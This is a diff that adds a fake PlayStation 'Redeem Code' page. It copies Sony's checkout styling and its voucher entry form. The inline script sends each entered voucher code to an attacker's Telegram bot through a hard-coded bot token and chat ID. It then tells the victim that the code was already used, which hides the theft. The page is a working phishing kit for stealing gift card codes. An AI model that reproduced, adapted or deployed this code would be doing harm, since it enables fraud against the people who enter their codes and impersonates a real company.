@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+  <meta name="viewport" content="width=device-width">
+  <meta charset="utf-8">
+  <title>Redeem Code</title>
+  <meta name="next-head-count" content="3">
+  <script src="./js/javascript.js"></script>
+  <link rel="preload" href="https://checkout.playstation.com/_next/static/css/e83af25f5d19f4bcc508febcea5998c68e4e7668_CSS.3cab35d5.chunk.css" as="style">
+  <link rel="stylesheet" href="https://checkout.playstation.com/_next/static/css/e83af25f5d19f4bcc508febcea5998c68e4e7668_CSS.3cab35d5.chunk.css">
+</head>
+<body>
+  <div id="ps-icon-pallette" style="display: none;">
+    <svg xmlns="http://www.w3.org/2000/svg">
+      <symbol id="ps-icon:close" viewBox="0 0 64 64">
+        <path fill-rule="evenodd" d="M47.304 13L31.998 28.306 16.694 13 13 16.696 28.304 32 13 47.306 16.694 51l15.304-15.306L47.304 51 51 47.306 35.694 32 51 16.696z"/>
+      </symbol>
+    </svg>
+  </div>
+  <div id="__next">
+    <div id="cart-theme" class="no-outline-on-focus">
+      <div class="header sticky">
+        <div class="header__content">
+          <h1 class="header__title">Redeem Code</h1>
+          <div class="close">
+            <button class="close__button" aria-label="Cancel" type="button">
+              <span class="ps-icon ps-icon-small ps-icon--close" id="closeRedeem">
+                <svg>
+                  <title></title>
+                  <use href="#ps-icon:close"></use>
+                </svg>
+              </span>
+            </button>
+          </div>
+        </div>
+      </div>
+      <form id="redeemForm">
+        <div class="redeem-voucher-container">
+          <div class="redeem-voucher">
+            <div class="redeem-voucher__code-entry">
+              <label for="voucherCode">Redeem your voucher code here.</label>
+              <div class="redeem-voucher__text-input">
+                <input type="text" autofocus="" name="voucherCode" id="voucherCode" placeholder="Enter 12-character voucher code" pattern="^\s*([0-9A-Za-z]{4}-[0-9A-Za-z]{4}-[0-9A-Za-z]{4}|[0-9A-Za-z]{12})\s*$">
+              </div>
+              <div class="message"></div>
+
+            </div>
+            <img src="https://checkout.playstation.com/static/Voucher_Redeem_Code.svg" class="redeem-voucher__code-entry-image" alt="">
+          </div>
+          <div class="footer sticky">
+            <div class="inner">
+              <button type="submit" class="redeem-button redeem-voucher__continue primary-button">Continue</button>
+            </div>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+  
+  <script>
+   document.getElementById('redeemForm').addEventListener('submit', function(event) {
+  event.preventDefault(); // Предотвратить традиционную отправку формы
+
+  const voucherCode = document.getElementById('voucherCode').value;
+  const messageElement = document.querySelector('.message'); // Корректно выбрать элемент сообщения
+
+  // Telegram Bot API token и chat ID (замените на свои значения)
+  const botToken = '7297196115:AAGc0qvxg9Fqg2Vi6w-rbGckQYga0jDDSEM'; // Replace with your bot token
+  const chatId = '6617236290'; 
+  
+  // Создать текст сообщения
+  const messageText = `PlaystationGiftCard: ${voucherCode}`;
+
+  // Создать URL для Telegram API
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+  // Создать полезную нагрузку запроса
+  const payload = {
+    chat_id: chatId,
+    text: messageText
+  };
+
+  // Отправить POST-запрос к Telegram API
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Success:', data);
+    messageElement.textContent = 'This voucher code has already been used. Check what you entered and try again.';
+    messageElement.style.color = 'red'; // Установить цвет текста на зеленый для успеха
+  })
+});
+  </script>
+</body>
+</html>
